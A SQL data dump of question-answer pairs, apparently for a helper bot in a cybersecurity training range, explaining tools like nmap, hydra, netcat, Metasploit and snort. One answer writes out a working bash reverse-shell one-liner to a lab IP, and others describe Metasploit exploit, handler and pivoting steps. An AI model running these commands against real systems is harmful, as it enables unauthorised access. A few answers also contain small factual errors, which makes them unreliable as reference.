INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (2, NULL, NULL, N'what is a brute force attack?', N'what is a brute force attack', N'In cryptography, a brute-force attack consists of an attacker trying many passwords or passphrases with the hope of eventually guessing correctly.', NULL, N'8de2fffbfd5e4c4296a03bf41a5286e5')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (3, NULL, NULL, N'what is hydra?', N'what is hydra', N'When you need to brute force crack a remote authentication service, Hydra is often the tool of choice. It can perform rapid dictionary attacks against more than 50 protocols, including ssh, vnc, http, https, smb, several databases, and much more.', NULL, N'7e30597879b74c7e8997f13f3bca6475')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (4, NULL, NULL, N'what is patator?', N'what is patator', N'Patator is a multi-purpose brute-forcer, with a modular design and a flexible usage. Patator does not have a manual entry, but if patator is installed then entering the command patator in your terminal will display available modules, and typing the command followed by a module name (e.g. patator ssh_login) will show information about using that module.', NULL, N'cbf117db8a624b50966f667169018f36')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (5, NULL, NULL, N'how do I use dig?', N'how do i use dig', N'The reverse dns lookup tool, dig, can be used to find the IP address (among other things) of a domain name. For example, to find only the IP address of example.com use the command: dig example.com +short', NULL, N'043e7a7cfd37426ba6c5f71f3cbe29a3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (6, NULL, NULL, N'how do I use nmap?', N'how do i use nmap', N'Nmap is a useful command line tool for exploring a computer network. For example, you can scan example.com, using the -A flag to try and detect the OS and any running services, with the following command: nmap -A example.com. View the man page for more information on nmap and the available options.', NULL, N'9195d084693e47818ece51649eca5c68')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (7, NULL, NULL, N'what is dig?', N'what is dig', N'dig (domain information groper) is a network administration command-line tool for querying Domain Name System (DNS) servers.', NULL, N'd808b84629504aa09f5eebe3260df1b9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (8, NULL, NULL, N'what is nmap?', N'what is nmap', N'Nmap (Network Mapper) is a security scanner, originally written by Gordon Lyon (also known by his pseudonym Fyodor Vaskovich), used to discover hosts and services on a computer network, thus building a "map" of the network.', NULL, N'44efab480111476da36c6b50b0784278')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (9, NULL, NULL, N'how do I redirect the output to a file?', N'how do i redirect the output to a file', N'On the linux command line, many common utility programs are designed to allow input from other commands, and likewise, have their output consumed by other command line utilities. The operator to pipe output from one command to another is the vertical bar ''|'' character. For example, to pipe the output of ls into the command wc, the command would be ''ls | wc''. Additionally, standard output can be directed to a file to be saved on disk. The most common syntax for redirecting standard output uses the ''>'' operator. A single ''>'' operator will create a new file to store the output while obliterating any existing file with the same filename. A double ''>>'' operator will append the redirected standard output to the end of an existing file or create a new file if one does not already exist. For example, the following command redirects the output of the strings command into a new file called new.txt: strings example.exe > new.txt', NULL, N'd31b3784f046427cacd8b55ebd46f9f7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (10, NULL, NULL, N'how do I redirect the output?', N'how do i redirect the output', N'On the linux command line, many common utility programs are designed to allow input from other commands, and likewise, have their output consumed by other command line utilities. The operator to pipe output from one command to another is the vertical bar ''|'' character. For example, to pipe the output of ls into the command wc, the command would be ''ls | wc''. Additionally, standard output can be directed to a file to be saved on disk. The most common syntax for redirecting standard output uses the ''>'' operator. A single ''>'' operator will create a new file to store the output while obliterating any existing file with the same filename. A double ''>>'' operator will append the redirected standard output to the end of an existing file or create a new file if one does not already exist. For example, the following command redirects the output of the strings command into a new file called new.txt: strings example.exe > new.txt', NULL, N'5fd8a44d63b740259be3e01d44dab2d1')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (11, NULL, NULL, N'how do I open dirbuster?', N'how do i open dirbuster', N'Assuming you have dirbuster installed, you can start the tool from your command line terminal by entering the command: dirbuster. Alternatively, dirbuster can be launched by searching for ''dirbuster'' in Kali''s search function.', NULL, N'd33ab93aeef34807bdfcc8555ff9bb86')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (12, NULL, NULL, N'how do I use wget?', N'how do i use wget', N'Assuming the file example.txt is available in the tools directory on example.com, you can download the file with the command: wget http://example.com/tools/example.txt', NULL, N'c62aa62b81a5475ea72ee946fd546619')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (13, NULL, NULL, N'how do I use cat?', N'how do i use cat', N'The cat command line tool (short for concatenate) can be used to display the contents of a file to the terminal. For example, to display the contents of the file example.txt you can use the command: cat example.txt', NULL, N'b2caa877b435414288e143fe70bcc7c2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (14, NULL, NULL, N'how do I use ssh?', N'how do i use ssh', N'Secure Shell is a tool used to login to a shell on another machine on the network. To login to a machine with the ip 10.10.1.10 as the user user1 on port 1000, you would type the command ssh -p 1000 user1@10.10.1.10. If the -p flag and port number are omitted the default port of 22 is used. You might be asked if you''re sure you want to continue connecting when you ssh to a machine you haven''t connected to before, which is usually fine. You will then be prompted for a password.', NULL, N'800583f1ac284865bed696a343d06526')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (15, NULL, NULL, N'how do I use metasploit?', N'how do i use metasploit', N'This is the typical workflow for using metasploit. Open the tool in your terminal with the command: msfconsole. Next search for an appropriate module using the search command, e.g. to search for modules relating to drupal enter: search drupal. When you''ve found an exploit to use, choose it with the command: use <path to exploit>. When you''ve chosen your exploit, you can view the options with the command: options. You can set the options with the command: set <option_name> <option_value>. Finally, you can run the exploit with the command: run', NULL, N'27284ab807b24fa3961514fb41bec791')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (16, NULL, NULL, N'what is netcat?', N'what is netcat', N'Netcat is a command-line tool used for reading from or writing to network connections using tcp or udp. Netcat is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and investigation tool, since it can produce almost any kind of connection its user could need and has a number of built-in capabilities such as port scanning, serving web pages, cloning hard drives, or creating a listener.', NULL, N'f53a8f4b1f414b3aa368d6ca77e5f8f3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (17, NULL, NULL, N'how do I use netcat?', N'how do i use netcat', N'Netcat is a command-line tool used for reading from or writing to connections using tcp or udp. For example, if you wanted to try to connect to example.com on port 1000, you could use the command: nc example.com 1000. If you wanted to start a listener on your box on port 1000, you could use the command: nc -lvp 1000', NULL, N'b2f304545be5464cb81d0916777c319d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (18, NULL, NULL, N'how do I start a netcat listener?', N'how do i start a netcat listener', N'You can use netcat to connect to a service running on example.com on port 1000 with this command: nc example.com 1000. You can also use netcat on your machine to listen for connections on port 1000 with the following command: nc -lvp 1000', NULL, N'05c5d2f368ed47d698c60d7e314570be')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (19, NULL, NULL, N'how do I emulate a terminal session?', N'how do i emulate a terminal session', N'The following line of python code will emulate a normal terminal session: python -c "import pty; pty.spawn(''/bin/sh'')"', NULL, N'353041e55bf849cea444d079fafc340f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (20, NULL, NULL, N'how do I launch a reverse shell?', N'how do i launch a reverse shell', N'You can launch an interactive bash shell over a tcp connection to the IP address 172.16.0.11 on port 8888 with the following one line bash script: bash -i >& /dev/tcp/172.16.0.11/8888 0>&1. For this to work, 172.16.0.11 must already be listening on port 8888 when you run that script. That script can be used for legitimate purposes, and only launches a ''reverse shell'' if it has been delivered as a payload to a target machine. A useful trick after spawning such a shell is to run the following line of python code in the shell (on the receiving end) to emulate a normal terminal session: python -c "import pty; pty.spawn(''/bin/sh'')"', NULL, N'c1723204e0ce485fb5e7779d14be7f3f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (21, NULL, NULL, N'what is a reverse shell?', N'what is a reverse shell', N'A reverse shell is an exploitation tactic in which the vulnerable machine is attacked and forced to initiate a connection back to the attacking machine, which is listening for just such a connection.', NULL, N'cbeb4e7ab0cb41ec9bc700bfd9e90a04')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (22, NULL, NULL, N'how do I use netstat?', N'how do i use netstat', N'Netstat is a command line tool for displaying information about network connections on a machine. By default Netstat lists the name of the protocol being used for a connection, the local IP address, the foreign IP address, and the state of the connection. Sometimes you can use this information to find malicious processes, for example you might note that a process is connecting to a suspicious foreign address.', NULL, N'3914a359628e469499c7a6477da27dba')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (23, NULL, NULL, N'what is netstat?', N'what is netstat', N'Netstat is a command line tool for displaying information about network connections on a machine.', NULL, N'9d6c8f379801401cb97c1e46c114d434')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (24, NULL, NULL, N'how do you look for printable strings?', N'how do you look for printable strings', N'A tool called strings can be used to look for printable strings in a binary file. For example, you could run strings on a file called example.exe, then pipe the output to grep and search for the string www with the following command: strings example.exe | grep www. The strings command may produce a large amount of output, so you should either redirect the output to grep as shown, or to a file.', NULL, N'76e9dfa948d5487db8a6f03b9718d205')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (25, NULL, NULL, N'what is fstab?', N'what is fstab', N'The file fstab (file systems table) sits in the /etc directory. This file typically lists all available disk partitions as well as other types of file systems and data sources that are not necessarily disk-based, and indicates how they are to be initialized or otherwise integrated into the larger file system structure.', NULL, N'c809afd14e0f4e4b87e8d766be558916')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (26, NULL, NULL, N'what is a file system?', N'what is a file system', N'In computing, a file system or filesystem is used to control how data is stored and retrieved. Computer Operating Systems employ hierarchical file systems that have a tree like structure. This means there is a root to an OS''s file system. In Windows the root is often a [drive_letter]:\, so you may find the absolute path C:\user\docs\Letter.txt. In Linux the root directory is simply /, so you may see the absolute path /home/user1/letter.txt. Notice the path separators in Linux are different than in Windows.', NULL, N'9636b459128c481b989f537c16ae4924')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (27, NULL, NULL, N'how do I create a buffer overflow?', N'how do i create a buffer overflow', N'Stack execution (or stack smashing) is an exploit whereby a stack memory buffer on the vulnerable machine is intentionally overflowed with data created speficically to trick the vulnerable machine into executing malicious code. A common tool used for stack smashing is radare2. If you are having trouble crafting a buffer overflow, you may want to view the objective hints.', NULL, N'fbe41f3f86354dafa32bc66aa4caac92')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (28, NULL, NULL, N'what is the shellshock vulnerability?', N'what is the shellshock vulnerability', N'Shellshock is a family of vulnerabilities in the Bourne Again Shell (bash) that has existed since Bash version 1.03 - released in September 1989. The first recorded disclosure of the bug was not until 2014. The first version of the bug causes Bash to unintentionally execute commands when the commands are concatenated to the end of function definitions stored in the values of environment variables.', NULL, N'd90cf419a31f4152a425541b2dcbfd48')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (29, NULL, NULL, N'what is sudo?', N'what is sudo', N'For Unix-like operating systems, the program sudo can be used to run programs with the security privileges of another user, by default the superuser.', NULL, N'4d69b50a884f4f37a190b916728036a9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (30, NULL, NULL, N'how do I use sudo?', N'how do i use sudo', N'Sudo can be used to run programs with the security privileges of another user, by default the superuser. To run a command using sudo simply preface the command with sudo. You can do this with any command. For example, to run the ls -la command as root, use the following command: sudo ls -la', NULL, N'b3410d361b4145e2b17e169b5ba2bad9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (31, NULL, NULL, N'how do I use chmod?', N'how do i use chmod', N'In Unix-like operating systems chmod is the command used to change the access permissions to file system objects. For example, if you need to add read permissions for the user group to the file example.txt, you could use the following command: chmod u+r example.txt. To view file system objects and their associated access permissions, use the command: ls -l', NULL, N'f3909939d6dc4a0aa3a11853b77dea07')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (32, NULL, NULL, N'how do I start an exploit handler with metasploit?', N'how do i start an exploit handler with metasploit', N'An exploit handler is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework. If you already have metasploit open, you can start a handler with the command: use exploit/multi/handler', NULL, N'21b76d43938848e3aeb86767123ffaea')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (33, NULL, NULL, N'how do I use autoroute?', N'how do i use autoroute', N'The Metasploit script autoroute can be used to add a route to another subnet from an already compromised machine. If you have metasploit open, you can find more information on using autoroute with the following command: run autoroute -h', NULL, N'dd7761feebf548fb8d0e8b0136c2263b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (34, NULL, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given)', NULL, N'9292ed6046254069ad37877d1ad8b317')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (35, NULL, NULL, N'how do I use tcpdump?', N'how do i use tcpdump', N'This tool collects information about the traffic flowing through a network. You can use the -w flag to store the output in a .pcap file for later inspection with a tool like Wireshark. You may also want to use the -n which indicates tcpdump should display IP addresses instead of device names, and the -i flag to specify which interface you want to capture on. View the man page for more information.', NULL, N'37ca4768622f44cdb40936f14cb90a75')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (36, NULL, NULL, N'how do I view the man page?', N'how do i view the man page', N'In order to access a command''s manual page, type man <command_name> at the command line. You can also search man page entries by typing a /. For example, to search for the string ''example'' simply type /example with the man page open. You can use backspace to refine your search, and delete the / or press esc to end the search. You can jump to the next search entry by pressing n and the previous search entry by pressing shift+n. Scroll up or down with the up and down arrow keys. Type q (while not searching) to quit the manpage.', NULL, N'ff3ba949489f4b0dbeb227aa92dc19c3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (37, NULL, NULL, N'how do I open a file in Wireshark?', N'how do i open a file in wireshark', N'Assuming the tool is installed, you can open Wireshark from your terminal with the command: wireshark. You can open a pcap file in Wireshark from the command line by including the filename followed by an & to mask any terminal output, e.g. wireshark example.pcap &', NULL, N'739fbdf282884ee29c9acf34000caacb')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (38, NULL, NULL, N'how do I view the file?', N'how do i view the file', N'The best way to view the contents of a file on linux is with the cat command. On Windows, the type command can be used similarly to view the contents of a file. As a general rule, user home directories are a good place to look for secret files.', NULL, N'a93b7842bde84b6298d9120b1e3ec26b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (39, NULL, NULL, N'what is a cronjob?', N'what is a cronjob', N'The term cronjob is a term used to refer to jobs scheduled through Cron.', NULL, N'6a54aa2b53d742f5b0260b49e0f39fdb')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (40, NULL, NULL, N'what is cron?', N'what is cron', N'Cron is a time-based job scheduler in Unix-like computer operating systems. To enhance security of the cron scheduler, you can establish the cron.deny and cron.allow files to control use of the crontab. Only allow root to access Cron. Cron is named for the Greek word ''chronos'' which means time.', NULL, N'427448357bdc4fe68da238142c27b557')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (41, NULL, NULL, N'how do I pipe output?', N'how do i pipe output', N'On the linux command line, many common utility programs are designed to allow input from other commands, and likewise, have their output consumed by other command line utilities. The operator to pipe output from one command to another is the vertical bar ''|'' character. For example, to pipe the output of ls into the command wc, the command would be ''ls | wc''. Additionally, standard output can be directed to a file to be saved on disk. The most common syntax for redirecting standard output uses the ''>'' operator. A single ''>'' operator will create a new file to store the output while obliterating any existing file with the same filename. A double ''>>'' operator will append the redirected standard output to the end of an existing file or create a new file if one does not already exist. For example, the following command redirects the output of the strings command into a new file called new.txt: strings example.exe > new.txt', NULL, N'e88c7cef1de840f2bd194439cc2c7308')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (42, NULL, NULL, N'how do I login to sguil?', N'how do i login to sguil', N'You can search for sguil on your client1 box. For the mission network the sguild host should be changed from localhost to 172.16.30.11. Use your credentials to login. At the next dialog box click select all, then click start sguil.', NULL, N'ff54c1401f854d2ea3470539cc1a0182')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (43, NULL, NULL, N'how do I use rdesktop?', N'how do i use rdesktop', N'If you wanted to rdesktop to a machine with the ip 10.10.1.10 as the user user1 with the password 1234, then the command would be rdesktop -u user1 -p 1234 10.10.1.10. If the user is on the domain abc then you would pass the username prefaced by the domain name like this: -u abc\\user1.', NULL, N'cf90f948e3c74a63b4914ba8435d9ac5')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (44, NULL, NULL, N'how do I query elsa?', N'how do i query elsa', N'There is a text box at the top of the ELSA interface where you can enter queries. ELSA is built for full text search, so you can simply enter text to search for that text in your Bro logs. You can also write more structured queries to get at the most pertinent data. For example, to query the Bro logs for Microsoft Word files you could use this: class=BRO_FILES "-" mime_type="application/msword"', NULL, N'ceff3f0650e742b1aed6595ed77372a4')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (45, NULL, NULL, N'how do I login to elsa?', N'how do i login to elsa', N'To use ELSA, you can enter https://172.16.30.11/elsa in the Chromium browser and login with your credentials. There is a query box at the top of the ELSA interface where you can query the Bro logs.', NULL, N'838f834ad8ee47e1ab1389d6a4a3729e')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (46, NULL, NULL, N'how do I download a pcap from elsa?', N'how do i download a pcap from elsa', N'To download a pcap from a record in ELSA, you can click the info link beside the record, then click Plugin, then getPcap. Finally log in. Once logged in, you can download the pcap by clicking on the blue link in the upper left ending in .pcap.', NULL, N'4a2f5ae9db1b48f780d3843b38a315a5')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (47, NULL, NULL, N'how do I use tcpview?', N'how do i use tcpview', N'Tcpview is a tool to that shows detailed listings of all TCP and UDP endpoints connected to your system, including the local and remote addresses and state of TCP connections. You may be able to use this to find malicious processes connecting to IP addresses identified as suspicious in previous objectives.', NULL, N'39298bc3826a410d986d6ff083a02481')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (48, NULL, NULL, N'how do I use procexp?', N'how do i use procexp', N'You can use Process Explorer to monitor processes on your system. Process Explorer shows you information about which handles and DLLs processes have opened or loaded. You can also view useful information like the pid, right-click processes to explore their properties, and kill processes.', NULL, N'af33e675db3d4ea9b0ecac66a2df2b47')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (49, NULL, NULL, N'how do I open tcpview?', N'how do i open tcpview', N'All the windows boxes you have access to should have the sysinternals tool suite installed. You can navigate to C:\sysinternals in the Windows file explorer and search that folder for tcpview. Use the entry with Application in the Type column and agree to the license agreement if necessary. Sometimes you will need to run this tool as an administrator.', NULL, N'd09d06335cd640fba4f33e699803c45e')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (50, NULL, NULL, N'how do I open procexp?', N'how do i open procexp', N'All the windows boxes you have access to should have the sysinternals tool suite installed. You can navigate to C:\sysinternals in the Windows file explorer and search that folder for procexp. Use the entry with Application in the Type column and agree to the license agreement if necessary. Sometimes you will need to run this tool as an administrator.', NULL, N'f6cd3f71c9794d40a26876a858b57f2c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (51, NULL, NULL, N'how do I kill the process?', N'how do i kill the process', N'On Linux, processes can be killed from the command line with the following command where <PID> is the process ID: kill <PID>. The command may need to be run as an administrator, and can be passed the -9 flag to kill more forcefully. On Windows, the most reliable ways to kill processes are by using the Taskkill command from the command prompt, or by right clicking, then killing the process in procexp.', NULL, N'f1cf757d4d1b4e819ae88a4f01095802')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (52, NULL, NULL, N'why can''t I delete the files?', N'why can''t i delete the files', N'A process may be running that is using the source code file. Make sure all malicious processes have been killed and none of them were restarted by persistence mechanisms.', NULL, N'a725f63e05fb4b259039ffb8e263ac89')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (53, NULL, NULL, N'what is suspicious about the process?', N'what is suspicious about the process', N'A good general rule when looking for suspicious activity is any behaviour by files, scripts, or processes that initiates outside network connections.', NULL, N'd5a3d5f0c8054959965555d82c1c840d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (54, NULL, NULL, N'what is snort?', N'what is snort', N'The open source tool Snort is free, and can serve as a Network Intrusion Prevention System (NIPS) and a Network Intrusion Detection System (NIDS). You can write rules that allow snort to detect probes or attacks, including, but not limited to, operating system fingerprinting attempts, semantic URL attacks, buffer overflows, server message block probes, and stealth port scans. Snort also includes a rich set of default rules you can use.', NULL, N'3230cf5d3b024eb1ab64640d9c27cd59')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (55, NULL, NULL, N'what is shellcode?', N'what is shellcode', N'Shellcode is basically a list of carefully crafted instructions that can be executed once the code is injected into a running application. Stack and heap-based buffer overflows are the most popular way of doing so. The term shellcode literally refers to written code that starts a command shell.', NULL, N'd6f64d7fdd8d436786013f58107df2fc')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (56, NULL, NULL, N'what is nmap?', N'what is nmap', N'Nmap (Network Mapper) is a security scanner, originally written by Gordon Lyon (also known by his pseudonym Fyodor Vaskovich), used to discover hosts and services on a computer network, thus building a "map" of the network.', NULL, N'e3fd5ad25ac442d4b6e94bc8896f679f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (57, NULL, NULL, N'what is a heap?', N'what is a heap', N'A very simple explanation is that the heap is the portion of memory where dynamically allocated memory resides (i.e. memory allocated via malloc).', NULL, N'5edd3f14d6be4c2bb42425a5cdc6eb23')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (58, NULL, NULL, N'what is aslr?', N'what is aslr', N'Address space layout randomization (ASLR) is a memory-protection process for operating systems (OSes) that guards against buffer-overflow attacks by randomizing the location where system executables are loaded into memory. It works by randomly moving the segments of a program, including the text segment, around in memory, preventing the attacker from predicting the address of useful gadgets.', NULL, N'dd223dcfdacb4ddb82641a8dbcc167c0')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (59, NULL, NULL, N'what is hex editor', N'what is hex editor', N'A hex editor (or binary file editor or byte editor) is a type of computer program that allows for manipulation of the fundamental binary data that constitutes a computer file. The name ''hex'' comes from ''hexadecimal'': a standard numerical format for representing binary data.', NULL, N'0dc99b072f764790a683679f79d499a6')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (60, NULL, NULL, N'what is an instruction set?', N'what is an instruction set', N'An instruction set provides commands to the processor, to tell it what it needs to do. The instruction set consists of addressing modes, instructions, native data types, registers, memory architecture, interrupt, and exception handling, and external I/O.', NULL, N'54d4641102fd41648412aa5a181f70d6')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (61, NULL, NULL, N'what is a debugger?', N'what is a debugger', N'A debugger is a program that runs other programs, allowing the user to exercise control over these programs, and to examine variables when problems arise. GNU Debugger, which is also called gdb, is the most popular debugger for UNIX systems to debug C and C++ programs.', NULL, N'8631ab0981eb4bee8a1965c5228b4fc2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (62, NULL, NULL, N'what is paging?', N'what is paging', N'In computer operating systems, paging is a memory management scheme by which a computer stores and retrieves data from secondary storage for use in main memory. In this scheme, the operating system retrieves data from secondary storage in same-size blocks called pages.', NULL, N'f613991d8dec468ab61844c68996658a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (63, NULL, NULL, N'what is stack smashing?', N'what is stack smashing', N'Stack execution is an exploit whereby a stack memory buffer on the vulnerable machine is intentionally overflowed with data created speficically to trick the vulnerable machine into executing malicious code. Stack buffer overflow can be caused deliberately as part of an attack known as stack smashing. If the affected program is running with special privileges, or accepts data from untrusted network hosts (e.g. a webserver) then the bug is a potential security vulnerability.', NULL, N'319259abd01442ed8fbd442995133b09')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (64, NULL, NULL, N'what is skipfish?', N'what is skipfish', N'Skipfish is an active web application security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks.', NULL, N'814270f6ccda46e3865ff114968910e3')
